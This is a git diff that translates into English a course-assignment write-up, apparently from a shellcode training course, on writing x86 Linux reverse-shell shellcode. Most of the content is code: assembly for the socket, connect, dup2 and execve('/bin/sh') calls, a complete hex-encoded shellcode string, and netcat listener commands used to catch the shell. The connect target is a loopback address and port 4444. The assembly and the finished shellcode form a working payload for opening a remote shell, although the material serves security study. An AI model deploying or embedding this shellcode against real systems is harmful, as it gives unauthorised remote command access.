@@ -1,32 +1,34 @@
 # Assignement 2 #
 
-Dans le cadre du second exercice, il est demande de réaliser un shellcode permettant d'obtenir un shell distant.
+As part of the second exercise, it is requested to realize a shellcode allowing to obtain a distant shell.
 
-L'idée ici est dans un premier temps de créer un socket puis d'établir une connexion en indiquant une adresse IP ainsi qu'un port. Les sorties standard stdin, stdout et stderr sont redirigées afin de pouvoir être utilisées une fois la connexion établie par un shell distant. 
+The idea here is to create a socket at first the to make a connection giving an IP address and a port ID. The standard outputs stdin, stdout and stderr are redirected in order to be used once the connection is made by a distant shell. 
 
-## Création d'un socket ##
-La principale référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domaine, un type et un protocol. Nous prenons le protocol IPPROTO_IP = 0, un type égal à SOCK_STREAM avec la valeur 1 et enfin le domaine AF_INET avec la valeur 2.
+## Creation of a socket ##
+The main reference in bibliography is the documentation of the system calls http://man7.org/linux/man-pages/man2/socketcall.2.html. The socketcall is used to define the actions on the socketsaccording to the call field. The value “1” indicates that we are interested in a socket creation. Here we have to point to a domain, a type and a protocol. protocole is set to IPPROTO_IP = 0,
+the type is set to 1 (SOCK_STREAM) and the domain is set to 2 (AF_INET).
 
 ```c
 	xor ebx, ebx 			; ebx = 0
 	mul ebx				; eax=ebx=edx = 0
-	push ebx			; push 0 onto the stack
+	push ebx			; push 0 onto the stack   args protocol 0
 	inc ebx				; ebx = 1 = SYS_SOCKET = socket()
-	push ebx			; push 1 onto the stack
-	push byte 0x2			; push 2 onto the stack
+	push ebx			; push 1 onto the stack	  args SOCK_STREAM 1
+	push byte 0x2			; push 2 onto the stack args AF_INET
 	mov ecx, esp			; set ecx to the address of our args
 	mov al, 0x66			; syscall socketcall
 	int 0x80			; make the syscall socketcall(socket(2,1,0))
 ```
 
-## Création de la connexion ##
-Nous procédons de la même manière pour créer la connexion en indiquant l'adresse IP et le port logique. Nous nous sommes appuyé sur la structure sockaddr afin de connaître les différents élément necessaires.
+## Creation of the connection ##
+
+We create in the same way the connection indicating the IP address and the logic port ID. We used the sockaddr structure in order to know about the various necessary elements. 
 
 ```c
-	push 0x0101017f			; Construction de socketaddr : @Ip 127.1.1.1
+	push 0x0101017f			; @Ip 127.1.1.1
 	push dword 0x5c11 		; Port 4444
 	inc ebx
-    	push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
+    	push word bx     		; we put the value 2 for AF_INET
     	mov ecx, esp	
 	push 0x10			; addrlen
 	push ecx			; struct *addr
@@ -39,7 +41,7 @@ Nous procédons de la même manière pour créer la connexion en indiquant l'adr
 
 ## Redirection ##
 
-Ici, nous redirigeons les 3 sorties vers le socktfd via l'appel système dup2.
+At this stage, we redirect the 3 outputs to the socktfd via the system call système dup2.
 
 ```c
 	xor ecx, ecx				; set ecx to 0
@@ -52,10 +54,10 @@ _:
 
 ```
 
-## Exécution du shell ##
-nous allons pour cela utiliser execve, int execve(const char *filename, char *const argv[], char *const envp[]) afin de lancer un shell.
-Il sera de la forme execve("/bin/sh", NULL, NULL).
-Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
+## Shell execution ##
+We are going to use execve, int execve(const char *filename, char *const argv[], char *const envp[]) in order to launch the shell.
+It will be written as execve("/bin/sh", NULL, NULL).
+Then, the shell(/bin/bash) is executed once the connection is made.
 
 ```c
 	xor ecx,ecx				; ecx = 0
@@ -158,23 +160,27 @@ _:
 
 ## Exécution ##
 
-Nous utilisons comme dans le premier exercice le fichier test_shellcode.c avec les mêmes options de compilation.
+We use as in the first exercise the file test_shellcode.c with the same options of compilation.
 
-Sur le premier terminal:
-```
+On the first terminal:
+
+```c
 ./test_shellcode
 ```
 
-Sur le second terminal: 
+On the second terminal: 
+
 ```c
 nc -l -p 4444 -v
 pwd
 /home/xophidia
 ```
 
-## Améliorer la saisie de l'adresse IP et du port ##
+```
 
-Pour cette partie, nous utilisons un script python.
+## Improve the keying in of the Ip address and port ID ##
+
+At this stage, we’ll use a python script.
 
 ```python
 #!/usr/bin/env python
@@ -209,9 +215,9 @@ if __name__=='__main__':
 "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10
 \x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68
 \x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
-````
+```
 
-Nous recompilons comme lors de l'exemple précédent puis testons le tout.
+We compile again as in the previous exercise, then we test everything.
 
 ```c
 nc -l 127.1.1.1 -p 1234 -v
